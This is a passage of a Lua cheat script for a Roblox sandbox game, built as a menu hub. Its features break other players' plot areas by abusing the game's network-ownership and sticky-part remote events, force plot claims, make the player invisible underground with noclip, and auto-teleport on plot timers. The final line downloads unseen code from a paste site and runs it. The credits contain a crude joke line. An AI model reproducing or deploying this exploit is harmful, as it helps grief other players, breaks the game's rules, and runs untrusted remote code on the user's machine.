local Dropdown = Breakiroiro:AddDropdownEx("PlotSelect", {
    Text = "Select Plot (Break Plot Area)",
    Default = Config.SelectedPlot,
    Multi = true,
    Values = {
        {Name = "Purple-Plot", Image = "rbxassetid://9909725942"},
        {Name = "Red-Plot", Image = "rbxassetid://8989326312"},
        {Name = "Green-Plot", Image = "rbxassetid://8989327148"},
        {Name = "Blue-Plot", Image = "rbxassetid://9909733734"},
        {Name = "Chinese-Plot", Image = "rbxassetid://9108988013"},
    },
    Callback = function(options)
        Config.SelectBleakPlot = {}
        for _, opt in pairs(options) do
            local name = type(opt) == "table" and opt.Name or opt
            local mappedPlot = PLOT_MAP[name] or name
            table.insert(Config.SelectBleakPlot, mappedPlot)
        end
    end,
})

Breakiroiro:AddToggle("PlotBreakt", {
    Text = "Plot Break",
    Default = false,
    Callback = function(value)
        Config.plotBreakToggle = value
        if Config.plotBreakToggle then
            task.spawn(function()
                while Config.plotBreakToggle do
                    local validPlots = {}
                    for _, realPlotName in pairs(Config.SelectBleakPlot) do
                        local plot = workspace.Plots:FindFirstChild(realPlotName)
                        local area = plot and plot:FindFirstChild("PlotArea")
                        if area then
                            table.insert(validPlots, {Name = realPlotName, Area = area})
                        end
                    end

                    if #validPlots == 0 then
                        task.wait(1)
                        continue
                    end

                    local container = nil
                    if not PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) then
                        container = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    else
                        for _, v in pairs(workspace.Plots:GetChildren()) do
                            local sign = v:FindFirstChild("PlotSign")
                            local owners = sign and sign:FindFirstChild("ThisPlotsOwners")
                            if owners then
                                for _, b in pairs(owners:GetChildren()) do
                                    if b.Value == localPlayer.Name then
                                        local folder = workspace.PlotItems:FindFirstChild(v.Name)
                                        if folder then
                                            container = folder
                                            break
                                        end
                                    end
                                end
                            end
                            if container then break end
                        end
                        if not container then
                            container = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                        end
                    end

                    if not container then
                        task.wait(1)
                        continue
                    end

                    local alive = {}
                    for _, sh in pairs(Config.BleakPlotShuriken) do
                        if sh and sh.Parent then
                            table.insert(alive, sh)
                        end
                    end
                    Config.BleakPlotShuriken = alive

                    local needed = #validPlots - #Config.BleakPlotShuriken
                    if needed > 0 then
                        for i = 1, needed do
                            if not Config.plotBreakToggle then break end
                            local targetPlot = validPlots[#Config.BleakPlotShuriken + 1]
                            if not targetPlot then break end

                            local newSh = nil
                            local targetPart = targetPlot.Area

                            if targetPart and container then
                                local canSpawn = localPlayer:WaitForChild("CanSpawnToy")

                                local hrp
                                if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                    hrp = localPlayer.Character.HumanoidRootPart
                                else
                                    local character = GetCharacter()
                                    hrp = character and character:WaitForChild("HumanoidRootPart")
                                end
								if hrp and canSpawn.Value then
									local preExisting = {}
									for _, child in pairs(container:GetChildren()) do
										if child.Name == "NinjaShuriken" then
											table.insert(preExisting, child)
										end
									end
									local success, createdShuriken = pcall(function()
										spawntoy("NinjaShuriken", hrp.CFrame * CFrame.new(0, 2, 8), Vector3.new(0, 0, 0))
										local startTime = tick()
										while tick() - startTime < 2 do
											for _, child in pairs(container:GetChildren()) do
												if child.Name == "NinjaShuriken" and not table.find(preExisting, child) then
													return child
												end
											end
											task.wait()
										end
										return nil
									end)

                                    if success and createdShuriken then
                                        local soundPart = createdShuriken:FindFirstChild("SoundPart") or createdShuriken:WaitForChild("SoundPart", 0.1)
                                        if soundPart and SetNetworkOwner then
                                            pcall(function()
                                                SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
                                            end)
                                        end

                                        if createdShuriken:FindFirstChild("StickyPart") then
                                            pcall(function()
                                                StickyPartEvent:FireServer(
                                                    createdShuriken.StickyPart,
                                                    targetPart,
                                                    CFrame.new(9.99999996e+11, 9.99999996e+11, 9.99999996e+11, 1, 0, 0, 0, 1, 0, 0, 0, 1)
                                                )
                                            end)
                                        end
                                        newSh = createdShuriken
                                    end
                                end
                            end

                            if newSh then
                                table.insert(Config.BleakPlotShuriken, newSh)
                            end
                            task.wait(0.05)
                        end
                    end
                    for _ = 1, 10 do
                        if not Config.plotBreakToggle then break end
                        task.wait(0.05)
                    end
                end
                for _, sh in pairs(Config.BleakPlotShuriken) do
                    if sh and sh.Parent and DestroyToy then
                        pcall(function()
                            DestroyToy:FireServer(sh)
                        end)
                    end
                end
                Config.BleakPlotShuriken = {}
            end)
        else
            for _, sh in pairs(Config.BleakPlotShuriken) do
                if sh and sh.Parent and DestroyToy then
                    pcall(function()
                        DestroyToy:FireServer(sh)
                    end)
                end
            end
            Config.BleakPlotShuriken = {}
        end
    end
})

local TimeLabel = OOOOO:AddLabel("House-Time: 0")
local OwnerLabel = OOOOO:AddLabel("House-Owner: ?")
OOOOO:AddToggle("plottime", {
    Text = "Plot-Time",
    Default = false,
    Callback = function(Value)
        Config.HouseTPauto = Value

        if not Value and Config.isTeleported and Config.savedPosition then
            local hrp = HRP()
            if hrp then
                hrp.CFrame = Config.savedPosition
            end
            Config.isTeleported = false
            Config.savedPosition = nil
        end
    end
})

OOOOO:AddDropdownEx("PlotSelect2", {
    Text = "Select Plot",
    Default = Config.SelectedPlot,
    Values = {
        {Name = "Purple-Plot", Image = "rbxassetid://9909725942"},
        {Name = "Red-Plot", Image = "rbxassetid://8989326312"},
        {Name = "Green-Plot", Image = "rbxassetid://8989327148"},
        {Name = "Blue-Plot", Image = "rbxassetid://9909733734"},
        {Name = "Chinese-Plot", Image = "rbxassetid://9108988013"},
    },
    Callback = function(value)
        Config.SelectedPlot = value
    end
})

OOOOO:AddButton("PlotOO", {
    Text = "Claim Plot",
    Callback = function()
        local plot = GetPlot()
        if not plot then return end
        local isOwned = false
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local ownersFolder = sign:FindFirstChild("ThisPlotsOwners")
            if ownersFolder then
                local valueObject = ownersFolder:FindFirstChild("Value")
                if valueObject and valueObject:IsA("StringValue") then
                    if valueObject.Value and valueObject.Value ~= "" then
                        isOwned = true
                    end
                end
            end
        end
        if isOwned then return end
        local claimSign = plot:FindFirstChild("PlotSign")
        if not claimSign then return end
        for _, child in pairs(claimSign:GetChildren()) do
            if child.Name == "Sign" then
                local grab = child:FindFirstChild("Plus")
                    and child.Plus:FindFirstChild("PlusGrabPart")
                if grab then
                    local char = GetCharacter()
                    local cf = grab.CFrame * CFrame.new(-5, 0, -5)
                    if char and typeof(cf) == "CFrame" then
                        char.HumanoidRootPart.CFrame = cf
                    end
                    for i = 1, 15 do
                        local currentChar = GetCharacter()
                        if currentChar and grab and grab:IsA("BasePart") then
                            if localPlayer:DistanceFromCharacter(grab.Position) <= 30 then
                                SetNetworkOwner:FireServer(
                                    grab,
                                    lookAt(
                                        currentChar.HumanoidRootPart.Position,
                                        grab.Position
                                    )
                                )
                            end
                        end
                        task.wait()
                    end
                end
            end
        end
    end
})

Dev:AddIcontukiParagraph({
    Icon = 9508739140,
    content = "Owner"
})

Dev:AddIcontukiParagraph({
    Icon = 11152722145,
    content = "I'm one of the devs for this hub, lol"
})

Dev2:AddIcontukiParagraph({
    Icon = 7658014476,
    content = "SEX friends"
})

MenuGroup:AddToggle("KeybindMenuOpen", {
    Default = Library.KeybindFrame.Visible,
    Text = "Open Keybind Menu",
    Callback = function(value)
        Library.KeybindFrame.Visible = value
    end,
})

MenuGroup:AddToggle("ShowCustomCursor", {
    Text = "Custom Cursor",
    Default = true,
    Callback = function(Value)
        Library.ShowCustomCursor = Value
    end,
})

MenuGroup:AddDropdown("NotificationSide", {
    Values = { "Left", "Right" },
    Default = "Right",
    Text = "Notification Side",
    Callback = function(Value)
        Library:SetNotifySide(Value)
    end,
})

MenuGroup:AddDropdown("DPIDropdown", {
    Values = { "50%", "75%", "100%", "125%", "150%", "175%", "200%" },
    Default = "100%",
    Text = "DPI Scale",
    Callback = function(Value)
        Value = Value:gsub("%%", "")
        local DPI = tonumber(Value)
        Library:SetDPIScale(DPI)
    end,
})

MenuGroup:AddDivider()

MenuGroup:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind", { 
    Default = "X", 
    NoUI = true, 
    Text = "Menu keybind" 
})

MenuGroup:AddButton({
    Text = "Unload",
    Func = function()
        Library:Unload()
    end,
    DoubleClick = false
})

Library.ToggleKeybind = Options.MenuKeybind
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ "MenuKeybind" })
ThemeManager:ApplyToTab(Tabs.UISettings)
SaveManager:BuildConfigSection(Tabs.UISettings)
VortexNotify("Script loaded successfully")
service.RunService.Heartbeat:Connect(function()
    Config.Frames = Config.Frames + 1
    local CurrentTime = tick()
    if CurrentTime - LastTime >= 1 then
        local FPS = Config.Frames
        Config.Frames = 0
        LastTime = CurrentTime
        local ping = math.round(localPlayer:GetNetworkPing() * 1000)
        StatsLabel:SetText(string.format("FPS: %d | Ping: %sms", FPS, ping))
    end
end)

localPlayer.CharacterAdded:Connect(function(character)
    if Config.IsBypassRun then
        task.wait(0.1)
        local root = character:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = CFrame.new(0, -15000, 0)
        end
        task.spawn(lockCamera)
    end
end)

service.RunService.Heartbeat:Connect(function()
    if Invisibility and Invisibility.noclipEnabled and Invisibility.originalPosition then
        local characterHeight = Invisibility.originalPosition.Y
        local cameraTargetHeight = characterHeight + Invisibility.cameraOffset
        local targetUndergroundDepth = cameraTargetHeight - Invisibility.undergroundDepthOffset
        local currentPos = Invisibility.humanoidRootPart.Position
        if math.abs(currentPos.Y - targetUndergroundDepth) > 0.1 then
            Invisibility.humanoidRootPart.CFrame = CFrame.new(currentPos.X, targetUndergroundDepth, currentPos.Z)
        end
    end
end)

service.RunService.RenderStepped:Connect(function()
    if Invisibility and Invisibility.noclipEnabled and Invisibility.originalPosition then
        local characterPos = Invisibility.humanoidRootPart.Position
        local characterHeight = Invisibility.originalPosition.Y
        local cameraTargetHeight = characterHeight + Invisibility.cameraOffset
        local currentCF = Invisibility.camera.CFrame
        local lookVector = currentCF.LookVector
        local cameraPos = Vector3.new(characterPos.X, cameraTargetHeight, characterPos.Z)
        Invisibility.camera.CFrame = CFrame.new(cameraPos, cameraPos + lookVector)
    end
end)

localPlayer.CharacterAdded:Connect(function(newCharacter)
    task.wait(0.5)
    if Invisibility then
        Invisibility.character = newCharacter
        Invisibility.humanoidRootPart = newCharacter:WaitForChild("HumanoidRootPart")
        Invisibility.head = newCharacter:WaitForChild("Head")
        if Invisibility.noclipEnabled then
            Invisibility.originalPosition = Invisibility.humanoidRootPart.Position
            Invisibility.originalCameraCFrame = Invisibility.camera.CFrame
            Invisibility.humanoidRootPartTransparency = Invisibility.humanoidRootPart.Transparency

            if Invisibility.noclipConnection then
                Invisibility.noclipConnection:Disconnect()
            end
            Invisibility.noclipConnection = service.RunService.Stepped:Connect(function()
                for _, part in pairs(Invisibility.character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end)

            if Invisibility.humanoidRootPart then
                Invisibility.humanoidRootPart.Transparency = 1
            end

            local characterHeight = Invisibility.originalPosition.Y
            local cameraTargetHeight = characterHeight + Invisibility.cameraOffset
            local undergroundDepth = cameraTargetHeight - Invisibility.undergroundDepthOffset
            local undergroundPos = Vector3.new(Invisibility.humanoidRootPart.Position.X, undergroundDepth, Invisibility.humanoidRootPart.Position.Z)
            Invisibility.humanoidRootPart.CFrame = CFrame.new(undergroundPos)
        end
    end
end)

localPlayer.CharacterRemoving:Connect(function()
    if Invisibility and Invisibility.noclipEnabled then
        if Invisibility.noclipConnection then
            Invisibility.noclipConnection:Disconnect()
            Invisibility.noclipConnection = nil
        end
    end
end)

workspace.DescendantAdded:Connect(function(v)
    if v.Name == "GrabBeam" then
        Config.CountLines = Config.CountLines + 1
        if v.Parent and v.Parent.Parent and v.Parent.Parent.Parent then
            Config.LastLagS = v.Parent.Parent.Parent
        end
    end
end)

task.delay(2, function()
    local StartTick = tick()
    while task.wait(0.025) do
        if Config.AutoAntiLag then
            if tick() - StartTick >= 0.1 then
                local AntiLagState = Toggles["AntiLag"] and Toggles["AntiLag"].Value or false
                if not AntiLagState then
                    if Config.CountLines >= 40 then
                        local LagPlr = Config.LastLagS and service.Players:GetPlayerFromCharacter(Config.LastLagS)
                        if LagPlr then
                            VortexNotify("[LAG] : "..LagPlr.Name.."(@"..LagPlr.DisplayName..")")
                        else
                            VortexNotify("lag script detected.")
                        end
                        if Toggles["AntiLag"] then
                            Toggles["AntiLag"]:Set(true)
                        end
                        if setfpscap then
                            setfpscap(10000)
                        end
                    elseif workspace:GetRealPhysicsFPS() < 15 then
                        VortexNotify("lag script detected.")
                        if Toggles["AntiLag"] then
                            Toggles["AntiLag"]:Set(true)
                        end
                        if setfpscap then
                            setfpscap(10000)
                        end
                    end
                end
                StartTick = tick()
                Config.CountLines = 0
                for _, v in pairs(service.Players:GetPlayers()) do
                    if v ~= localPlayer then
                        local char = v.Character
                        if char then
                            local hrp = char:FindFirstChild("HumanoidRootPart")
                            if hrp and hrp.Massless then
                                local hum = char:FindFirstChild("Humanoid")
                                if hum and not hum.Sit then
                                    hrp.Massless = false
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end)

task.spawn(function()
    while task.wait(0.2) do
        local plot = GetPlot()
        if not plot then continue end

        local timeObj = plot:FindFirstChild("TimeRemainingNum", true)

        if timeObj and timeObj:IsA("IntValue") then
            local timeValue = timeObj.Value

            pcall(function()
                if TimeLabel and type(TimeLabel.SetText) == "function" then
                    TimeLabel:SetText("Plot-Time: " .. timeValue)
                end
            end)

            local hrp = HRP()
            if hrp then
                if Config.HouseTPauto then
                    if timeValue <= 14 then
                        if not Config.isTeleported then
                            Config.savedPosition = hrp.CFrame
                            Config.isTeleported = true

                            if plot:FindFirstChild("Teleport") then
                                hrp.CFrame = plot.Teleport.CFrame
                            else
                                hrp.CFrame = plot:GetModelCFrame()
                            end
                        end
                    elseif timeValue > 15 then
                        if Config.isTeleported and Config.savedPosition then
                            hrp.CFrame = Config.savedPosition
                            Config.isTeleported = false
                            Config.savedPosition = nil
                        end
                    end
                end
            end
        end

        local ownerName = nil
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local ownersFolder = sign:FindFirstChild("ThisPlotsOwners")
            if ownersFolder then
                local valueObject = ownersFolder:FindFirstChild("Value")
                if valueObject and valueObject:IsA("StringValue") then
                    ownerName = valueObject.Value
                end
            end
        end

        pcall(function()
            if OwnerLabel and type(OwnerLabel.SetText) == "function" then
                if ownerName and ownerName ~= "" then
                    OwnerLabel:SetText("Plot-Owner: " .. ownerName)
                else
                    OwnerLabel:SetText("Plot-Owner: ?")
                end
            end
        end)
    end
end)

SaveManager:LoadAutoloadConfig()
loadstring(game:HttpGet'https://pastefy.app/msii94Qa/raw')()